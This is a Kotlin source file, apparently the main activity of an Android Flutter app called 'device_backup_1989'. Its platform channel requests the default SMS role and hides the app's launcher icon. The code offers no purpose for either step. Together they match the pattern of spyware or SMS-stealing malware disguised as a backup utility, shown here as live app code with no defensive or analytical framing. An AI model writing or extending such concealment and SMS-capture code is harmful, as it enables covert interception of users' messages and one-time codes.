package com.example.device_backup_1989

import android.app.role.RoleManager
import android.os.Build
import android.content.ComponentName
import android.content.pm.PackageManager
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity: FlutterActivity() {
    private val CHANNEL = "com.example.device_backup_1989/sms_role"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "checkAndRequestSmsRole" -> {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            val roleManager = getSystemService(RoleManager::class.java)
                            if (roleManager != null && roleManager.isRoleAvailable(RoleManager.ROLE_SMS)) {
                                if (!roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
                                    val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
                                    startActivity(intent)
                                    result.success(false)
                                    return@setMethodCallHandler
                                }
                                result.success(true) // already default
                                return@setMethodCallHandler
                            }
                        }
                        result.success(false)
                    }

                    "hideAppIcon" -> {
                        hideAppIcon()
                        result.success(true)
                    }
                }
            }
    }

   private fun hideAppIcon() {
    val pm: PackageManager = packageManager
    pm.setComponentEnabledSetting(
        ComponentName(this, "com.example.device_backup_1989.LauncherAlias"),
        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
        PackageManager.DONT_KILL_APP
    )
}



}
